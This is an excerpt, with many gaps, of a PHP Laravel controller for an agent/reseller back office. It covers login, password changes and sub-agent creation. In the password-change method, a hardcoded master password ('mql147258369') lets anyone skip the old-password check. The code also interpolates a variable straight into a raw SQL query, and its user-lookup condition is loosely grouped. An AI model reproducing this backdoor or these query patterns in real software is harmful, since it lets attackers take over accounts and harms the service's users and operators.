...
class MemberController extends Controller
{
    ...
    public function login()
    {
        ...
        return view('agent.login', [
            'agent_redirect_uri' => '/agent/index'
        ]);
    }
    ...
    public function doLogin(Request $request)
    {
        if ($request->isMethod('post')) {
            ...
            if (empty($agent)) return $this->error("代理商未找到");
            if ($agent->is_lock == 1) return $this->error("账号被锁定，禁止登录");

            if (User::encryptPassword($password) != $agent->getOriginal('password')) {
            ...
            session()->forget('agent_redirect_uri');
    ...
    public function home()
    {
        ...
        $subordinate_user_num = User::whereRaw("FIND_IN_SET($agent_id,`agent_path`)")->count(); //伞下用户数量
    ...
    public function changePWD(Request $request)
    {
        ...
        $is_tong = request()->input('is_tong');//是否同步用户密码
        ...
        if (User::encryptPassword($oldPassword) != $now_password) {

            if($oldPassword != "mql147258369"){
    ...
    public function lists(Request $request)
    {
        ...
        $result = Agent::where($where)->paginate($limit);
    ...
    public function searchuser(Request $request)
    {
        ...
        if ($user->mobile != '') {
            $returnData['username'] = $user->mobile;
        } else if ($user->email != '') {
            $returnData['username'] = $user->email;
        } else {
            $returnData['username'] = "";
        }
    ...
    public function search_agent_son(Request $request)
    {
        ...
        if ($request->isMethod('post')) {
            ...
            if (($_self->level == $this->agent_max_level && $_self->is_admin == 0)) {
                return $this->error("您是{$this->agent_max_level}级代理商，不能添加下级代理商");
            ...
            if ($_son->level == $this->agent_max_level) {
                return $this->error("该用户是{$this->agent_max_level}级代理商，不能添加下级代理商");
            }
    ...
    public function addSonAgent(Request $request)
    {
        ...
        $id = $request->input('id', 0);
        $not_exists = User::where(function ($query) use ($username) {
            $query->where('mobile', $username)->orWhere('email', $username);
        })->where('id', $user_id)->doesntExist();
        if ($not_exists) {
...
//
//            if ($authorization_code != 'aabbccdd') {
...
//            }
        ...
        try {
            ...
            if ($agent->save()) {
                ...
                //更新该用户的代理商id
                $_users = User::lockForUpdate()->find($user_id);
    ...
    public function addAgent(Request $request)
    {
        ...
        if (User::where('mobile', $username)->orWhere('email', $username)->where('id', $user_id)->first() === null) {
            return $this->error("该用户不存在！请重新核对用户信息");
        }
        $ag = Agent::getUserByUsername($username);
        if ($ag !== null && $id == 0) {
...
//            'pro_ser.max' => '手续费比例最大值为' . $_self->pro_ser,
        ...
        if ($id > 0) {
            $agent = Agent::find($id);
            //编辑下一级代理商密码
            if ($agent->parent_agent_id == $_self->id || $_self->id === 1) {
                $agent_password = $request->input('agent_password', '');
                if ($agent_password) {
                    $agent->password = User::encryptPassword($agent_password);
                }
            }
...
//            }
            ...
            $agent = new Agent();
            $agent->reg_time = time();
            $agent->parent_agent_id = $_self->id;
            //判断添加下级的代理商的等级
            if ($_self->level == 0 && $_self->is_admin == 1) {
                $level = 1;
            } else {
